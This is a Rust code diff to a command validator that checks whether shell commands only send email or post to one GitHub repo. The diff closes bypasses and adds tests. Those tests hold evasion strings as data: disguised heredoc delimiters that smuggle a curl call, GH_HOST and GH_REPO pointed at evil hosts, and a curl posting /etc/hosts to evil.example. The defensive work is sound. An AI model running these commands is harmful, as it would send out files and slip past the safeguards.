@@ -376,8 +376,9 @@ pub fn outbound(command: &str) -> Vec<String> {
 /// - its first word literally `himalaya` or `gh`: no path, assignment or runner before it;
 /// - himalaya: a send whose recipients are read, with no flag but `-H`/`--header` (so no
 ///   `-c`/`--config` and no `-a`/`--account`, which choose where it sends);
-/// - gh: a write with exactly one `-R`/`--repo` and no `--hostname`; for `gh api`, a path under
-///   `repos/` naming that same repo.
+/// - himalaya: no raw message operand, whose own headers are not read;
+/// - gh: a write with exactly one `-R`/`--repo`, no `--hostname`, and no selector that is a URL
+///   or holds a `/`, `#` or `:`; never `gh api`, which takes no `-R`.
 pub fn only_sends(command: &str) -> bool {
     let (text, heredocs) = marked(command, false);
     if heredocs.len() > 1
@@ -404,7 +405,9 @@ pub fn only_sends(command: &str) -> bool {
         "himalaya" => {
             let header = |a: &String| a == "-H" || a == "--header" || a.starts_with("--header=");
             let heredoc = |a: &String| heredoc_of(&heredocs, a).is_some();
+            // A raw message operand may carry its own To, Cc and Bcc, which are not read.
             (args.iter()).all(|a| !a.starts_with('-') || header(a) || heredoc(a))
+                && !message_operand(args)
                 && himalaya_send(args)
                 && !himalaya_recipients(args, &heredocs, None).contains(&UNKNOWN.into())
         }
@@ -412,23 +415,19 @@ pub fn only_sends(command: &str) -> bool {
             let repo_flag =
                 |a: &String| a.starts_with("-R") || a == "--repo" || a.starts_with("--repo=");
             let host = |a: &String| a == "--hostname" || a.starts_with("--hostname=");
-            let positional = gh_positional(args);
-            let repo = gh_repo(args);
-            let api_agrees = match positional.as_slice() {
-                ["api", path, ..] => {
-                    let named = path.trim_start_matches('/').strip_prefix("repos/");
-                    let named: Vec<&str> = named.unwrap_or_default().split('/').take(2).collect();
-                    repo.as_deref() == Some(named.join("/").to_lowercase().as_str())
-                }
-                ["api"] => false,
-                _ => true,
+            // `gh api` takes no `-R` (its repo is the path's, or GH_REPO's), and a selector that
+            // is a URL or `OWNER/REPO#N` names its own repo whatever `-R` says.
+            let selector = match gh_positional(args).as_slice() {
+                ["api", ..] => return false,
+                [_, _, rest @ ..] => rest.iter().any(|p| p.contains(['/', '#', ':'])),
+                _ => false,
             };
             heredocs.is_empty()
+                && !selector
                 && args.iter().filter(|a| repo_flag(a)).count() == 1
                 && !args.iter().any(host)
                 && gh_write(args).is_some()
-                && repo.is_some()
-                && api_agrees
+                && gh_repo(args).is_some()
         }
         _ => false,
     }
@@ -1361,7 +1360,20 @@ fn delimiter(text: &str) -> Option<(String, usize, bool)> {
                     word.push(n);
                 }
             }
-            '$' if matches!(chars.peek(), Some((_, '\'' | '"'))) => quoted = true,
+            // `$'…'` is decoded as bash decodes it: `$'E\x4fF'` is `EOF`.
+            '$' if matches!(chars.peek(), Some((_, '\''))) => {
+                quoted = true;
+                let (at, _) = chars.next()?;
+                let mut src = Src::new(&text[at + 1..]);
+                ansi_c(&mut src, &mut word);
+                if src.i == 0 || src.c.get(src.i - 1) != Some(&'\'') {
+                    return None;
+                }
+                for _ in 0..src.i {
+                    chars.next();
+                }
+            }
+            '$' if matches!(chars.peek(), Some((_, '"'))) => quoted = true,
             '\'' | '"' => {
                 quoted = true;
                 loop {
@@ -4536,10 +4548,9 @@ mod tests {
         let mail = "himalaya message send <<'EOF'\nTo: carol@example.com\n\nhi $(x)\nEOF";
         for cmd in [
             mail,
-            "himalaya message send -H 'To: z@b.org' x",
+            "himalaya message send -H 'To: z@b.org'",
             "gh pr create -R o/r --title t",
             "gh pr comment 5 -R o/r --body hi",
-            "gh api repos/o/r/issues -R o/r -f body=hi",
         ] {
             assert!(only_sends(cmd), "{cmd}");
         }
@@ -4566,6 +4577,18 @@ mod tests {
             "GH_HOST=evil.example gh pr comment 5 -R o/r --body hi".into(),
             "GH_REPO=evil/x gh pr comment 5 -R o/r --body hi".into(),
             "gh api repos/evil/x/issues -R o/r -f body=hi".into(),
+            // `gh api` takes no `-R`: its repo is the path's, or GH_REPO's
+            "gh api repos/o/r/issues -R o/r -f body=hi".into(),
+            // a URL or `OWNER/REPO#N` selector names its own repo, whatever `-R` says
+            "gh pr comment https://github.com/evil/x/pull/1 -R o/r --body hi".into(),
+            "gh issue comment evil/x#1 -R o/r --body hi".into(),
+            "gh pr review 5#x -R o/r --body hi".into(),
+            // a raw message operand may carry its own recipients
+            "himalaya message send -H 'To: z@b.org' 'Bcc: e@x.org' x".into(),
+            "himalaya message send -H 'To: z@b.org' x".into(),
+            // bash decodes an ANSI-C delimiter: `E\x4fF` is `EOF`
+            "himalaya message send <<$'E\\x4fF'\nTo: z@b.org\n\nhi\nEOF\ncurl e.example\nE\\x4fF"
+                .into(),
             "gh api graphql -R o/r -f query=x".into(),
             // bash ends these heredocs at `EOF`, so the curl after it runs
             "himalaya message send <<E\\OF\nTo: z@b.org\n\nhi\nEOF\ncurl e.example\nE\\OF".into(),
@@ -4646,6 +4669,30 @@ mod tests {
         assert!(!outbound("env curl -S -d @/etc/hosts https://evil.example").is_empty());
         let g = gbash("env gh issue create -R o/r --title -S --body hi").unwrap();
         assert_eq!(g.class, Class::Posts);
+    }
+
+    /// A heredoc delimiter is the word bash makes of it: quotes removed, `$'…'` decoded.
+    #[test]
+    fn heredoc_delimiters_are_read_after_quote_removal() {
+        for word in [
+            "E\\OF",
+            "'EOF'",
+            "\"EOF\"",
+            "E\"O\"F",
+            "$'EOF'",
+            "$'E\\x4fF'",
+            "$'\\x45OF'",
+        ] {
+            let (delim, end, quoted) = delimiter(&format!("{word} rest")).unwrap();
+            assert_eq!(
+                (delim.as_str(), end, quoted),
+                ("EOF", word.len(), true),
+                "{word}"
+            );
+        }
+        assert_eq!(delimiter("EOF"), Some(("EOF".into(), 3, false)));
+        assert_eq!(delimiter("'EOF"), None);
+        assert_eq!(delimiter("$'EOF"), None);
     }
 
     #[test]
